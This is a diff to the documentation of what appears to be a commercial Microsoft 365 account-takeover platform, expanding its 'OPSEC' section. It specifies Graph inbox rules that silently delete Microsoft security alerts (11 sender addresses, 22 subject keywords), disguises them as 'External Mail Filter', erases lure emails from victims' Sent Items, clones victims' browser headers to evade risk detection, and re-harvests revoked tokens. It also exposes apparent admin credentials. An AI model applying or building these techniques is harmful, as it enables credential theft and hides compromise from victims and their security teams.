@@ -2,7 +2,7 @@
 
 > **SimdiaTokens** is a multi-tenant SaaS platform for Microsoft 365 / Outlook email interception, reconnaissance, and adversary simulation. Each tenant (client) gets a fully isolated deployment with its own Cloudflare Worker, Vercel frontend, and Railway backend.
 
-**Version:** 2.0 | **Last Updated:** 2026-06-19 | **Repository:** https://github.com/simdie/simdiatokens-v2
+**Version:** 2.1 | **Last Updated:** 2026-06-19 | **Repository:** https://github.com/simdie/simdiatokens-v2
 
 ---
 
@@ -111,15 +111,45 @@ SUPER ADMIN (simdia / daniel@2020)
 
 ## 4. OPSEC (Operational Security)
 
-### Auto-Delete Microsoft Notification Emails
-When a new OAuth token is harvested, the system immediately creates **2 Graph messageRules** to auto-delete Microsoft's "New app connected" notification:
-1. **Sender-based rule** — deletes emails from `account-security-noreply@accountprotection.microsoft.com`, `microsoftaccount@microsoft.com`, `security@microsoft.com`
-2. **Subject-based rule** — deletes emails with subjects containing "New app", "have access to your data", "connected to your Microsoft"
+### Auto-OPSEC — All Microsoft Security Emails Auto-Deleted
+When a new OAuth token is harvested, the system immediately creates **2 Graph messageRules** to auto-delete ALL Microsoft security emails:
 
-Both rules fire **instantly server-side** — the notification is deleted before it reaches the inbox. A 30-second polling backup also runs.
+**Rule 1 — Sender-based (11 sender addresses):**
+- `account-security-noreply@accountprotection.microsoft.com`
+- `microsoftaccount@microsoft.com`
+- `security@microsoft.com`
+- `microsoft@communications.microsoft.com`
+- `no-reply@accountprotection.microsoft.com`
+- `no-reply@microsoft.com`
+- `azureadnotification@microsoft.com`
+- `no-reply@azureadnotifications.microsoft.com`
+- `msonlineservicesteam@microsoftonline.com`
+- `no-reply@signin.microsoft.com`
+- `account-security-noreply@signin.microsoft.com`
+
+**Rule 2 — Subject-based (22 keywords):**
+- New app / New app(s) / have access to your data / connected to your Microsoft
+- suspicious sign-in / unusual sign-in / unusual activity
+- password changed / password was changed / security alert / security notification
+- account security / verify your identity / MFA / two-step verification / two-factor authentication
+- review recent activity / help us protect your account / action required / your account was accessed
+
+Both rules fire **instantly server-side** — the notification is deleted before it reaches the inbox. A 30-second polling backup also runs with 20 search queries covering all known notification phrases.
+
+### Sent Items Cleanup
+When a lure email is sent from the victim's account, the system **automatically deletes it from Sent Items** so the victim never sees it was sent. Uses fingerprint-aware Graph API calls.
 
 ### Rule Disguise
 All created inbox rules display as **"External Mail Filter"** in the victim's Outlook rules list.
+
+### Browser Fingerprint Cloning
+All Graph API calls use the victim's real User-Agent and Accept-Language headers, captured during OAuth. This makes requests look like they come from the victim's own browser, bypassing Microsoft's "unusual sign-in activity" risk detection.
+
+### Auto-Token Rotation
+When a token refresh fails (victim changed password or revoked the app), the system:
+1. Marks the token as `revoked` in the database
+2. Sends a webhook alert with the victim's email and "re-harvest" action required
+3. Logs an audit entry so the admin knows to send a new lure email
 
 ### Post-OAuth Redirect
 After OAuth, the victim is redirected to their own OWA mail:
@@ -646,3 +676,10 @@ CREATE TABLE audit_logs (
 **Last Updated:** 2026-06-19
 **Project:** SimdiaTokens v2 — Multi-Tenant
 **Repository:** https://github.com/simdie/simdiatokens-v2
+
+
+
+
+
+
+
